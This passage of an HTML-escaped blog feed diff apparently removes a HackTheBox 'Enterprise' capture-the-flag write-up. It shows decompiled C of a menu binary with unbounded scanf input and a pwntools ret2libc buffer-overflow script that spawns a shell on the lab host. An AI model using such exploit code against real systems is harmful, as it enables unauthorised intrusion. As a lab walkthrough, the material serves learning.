-  &lt;span class=&quot;n&quot;&gt;puts&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
-  &lt;span class=&quot;n&quot;&gt;puts&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;LCARS Bridge Secondary Controls -- Main Menu: &lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
-  &lt;span class=&quot;n&quot;&gt;puts&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;1. Navigation&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
-  &lt;span class=&quot;n&quot;&gt;puts&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;2. Ships Log&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
-  &lt;span class=&quot;n&quot;&gt;puts&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;3. Science&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
-  &lt;span class=&quot;n&quot;&gt;puts&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;4. Security&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
-  &lt;span class=&quot;n&quot;&gt;puts&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;5. StellaCartography&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
-  &lt;span class=&quot;n&quot;&gt;puts&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;6. Engineering&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
-  &lt;span class=&quot;n&quot;&gt;puts&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;7. Exit&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
-  &lt;span class=&quot;n&quot;&gt;puts&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Waiting for input: &quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
-  &lt;span class=&quot;n&quot;&gt;fflush&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;stdout&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
-  &lt;span class=&quot;n&quot;&gt;__isoc99_scanf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;%d&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;v2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
-  &lt;span class=&quot;k&quot;&gt;switch&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v2&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-  &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
-    &lt;span class=&quot;k&quot;&gt;case&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
-      &lt;span class=&quot;n&quot;&gt;puts&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Enter System Name and Warp Speed: &quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
-      &lt;span class=&quot;n&quot;&gt;fflush&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;stdout&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
-      &lt;span class=&quot;n&quot;&gt;__isoc99_scanf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;%s&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;v1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
-      &lt;span class=&quot;n&quot;&gt;puts&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;Unable to comply. Antimatter injectors are not responding&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
-      &lt;span class=&quot;n&quot;&gt;fflush&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;stdout&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
-      &lt;span class=&quot;n&quot;&gt;result&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;main_menu&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
-      &lt;span class=&quot;k&quot;&gt;break&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
-    &lt;span class=&quot;k&quot;&gt;case&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
-      &lt;span class=&quot;n&quot;&gt;puts&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Enter New Bridge Log: &quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
-      &lt;span class=&quot;n&quot;&gt;fflush&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;stdout&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
-      &lt;span class=&quot;n&quot;&gt;__isoc99_scanf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;%s&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;v1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
-      &lt;span class=&quot;n&quot;&gt;puts&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;Unable to comply. Tertiary data nodes are Offline&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
-      &lt;span class=&quot;n&quot;&gt;fflush&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;stdout&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
-      &lt;span class=&quot;n&quot;&gt;result&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;main_menu&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
-      &lt;span class=&quot;k&quot;&gt;break&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
-    &lt;span class=&quot;k&quot;&gt;case&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
-      &lt;span class=&quot;n&quot;&gt;puts&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;Secondary Routines not implemented&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;Returning to Main Menu&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
-      &lt;span class=&quot;n&quot;&gt;fflush&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;stdout&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
-      &lt;span class=&quot;n&quot;&gt;result&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;main_menu&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
-      &lt;span class=&quot;k&quot;&gt;break&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
-    &lt;span class=&quot;k&quot;&gt;case&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;4&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
-      &lt;span class=&quot;n&quot;&gt;puts&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Disable Security Force Fields&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
-      &lt;span class=&quot;n&quot;&gt;puts&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Enter Security Override:&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
-      &lt;span class=&quot;n&quot;&gt;fflush&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;stdout&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
-      &lt;span class=&quot;n&quot;&gt;__isoc99_scanf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;%s&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;v3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
-      &lt;span class=&quot;n&quot;&gt;result&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Rerouting Tertiary EPS Junctions: %s&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;v3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
-      &lt;span class=&quot;k&quot;&gt;break&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
-    &lt;span class=&quot;k&quot;&gt;case&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;5&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
-      &lt;span class=&quot;n&quot;&gt;puts&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;Secondary Routines not implemented&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;Returning to Main Menu&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
-      &lt;span class=&quot;n&quot;&gt;fflush&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;stdout&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
-      &lt;span class=&quot;n&quot;&gt;result&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;main_menu&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
-      &lt;span class=&quot;k&quot;&gt;break&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
-    &lt;span class=&quot;k&quot;&gt;case&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;6&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
-      &lt;span class=&quot;n&quot;&gt;puts&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;Secondary Routines not implemented&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;Returning to Main Menu&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
-      &lt;span class=&quot;n&quot;&gt;fflush&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;stdout&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
-      &lt;span class=&quot;n&quot;&gt;result&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;main_menu&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
-      &lt;span class=&quot;k&quot;&gt;break&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
-    &lt;span class=&quot;k&quot;&gt;case&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;7&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
-      &lt;span class=&quot;n&quot;&gt;exit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
-      &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;result&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
-    &lt;span class=&quot;nl&quot;&gt;default:&lt;/span&gt;
-      &lt;span class=&quot;n&quot;&gt;result&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;unable&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
-      &lt;span class=&quot;k&quot;&gt;break&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
-  &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
-  &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;result&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
-&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;From that 7 options just number 1,2,4 is prompt an input with scanf and we could try buffer overflow
-But i can’t manage to solve this because have &lt;code class=&quot;highlighter-rouge&quot;&gt;PIE&lt;/code&gt; protection which make i can’t get the exact location address for my shellcode because its randomized&lt;/p&gt;
-
-&lt;p&gt;After seeing ippsec video about this, actually the &lt;code class=&quot;highlighter-rouge&quot;&gt;ASLR&lt;/code&gt; is disable in &lt;code class=&quot;highlighter-rouge&quot;&gt;/proc/sys/kernel/randomize_va_space&lt;/code&gt;
-you can verified that by running &lt;code class=&quot;highlighter-rouge&quot;&gt;ldd /bin/lcars | grep libc&lt;/code&gt;&lt;/p&gt;
-
-&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;#script by ippsec&lt;/span&gt;
-&lt;span class=&quot;kn&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;pwn&lt;/span&gt; &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;
-
-&lt;span class=&quot;n&quot;&gt;context&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;os&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Linux&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;arch&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;i386&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-&lt;span class=&quot;n&quot;&gt;HOST&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;PORT&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;10.10.10.61&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;32812&lt;/span&gt;
-
-&lt;span class=&quot;c&quot;&gt;#EIP Overwrite @ 212&lt;/span&gt;
-&lt;span class=&quot;n&quot;&gt;junk&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x90&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;212&lt;/span&gt;
-
-&lt;span class=&quot;n&quot;&gt;ret2libc&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;p32&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0xf7e4c060&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;c&quot;&gt;# system&lt;/span&gt;
-&lt;span class=&quot;n&quot;&gt;ret2libc&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;p32&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0xf7e3faf0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;c&quot;&gt;# exit&lt;/span&gt;
-&lt;span class=&quot;n&quot;&gt;ret2libc&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;p32&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0xf7f6ddd5&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;c&quot;&gt;# sh&lt;/span&gt;
-
-&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;junk&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ret2libc&lt;/span&gt;
-&lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;remote&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;HOST&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;PORT&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-&lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;recvuntil&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Enter Bridge Access Code:&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-&lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sendline&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;picarda1&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-&lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;recvuntil&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Waiting for input:&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-&lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sendline&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;4&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-&lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;recvuntil&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Enter Security Override:&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-&lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sendline&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-&lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;interactive&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
-
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-  
-  &lt;p&gt;&lt;a href=&quot;http://localhost:4000/hackthebox/writeup-hackthebox-enterprise&quot;&gt;Writeup Hackthebox - Enterprise&lt;/a&gt; was originally published by Abdillah Muhamad at &lt;a href=&quot;http://localhost:4000&quot;&gt;@abdilahrf&lt;/a&gt; on March 18, 2018.&lt;/p&gt;</content>
 </entry>
 
 
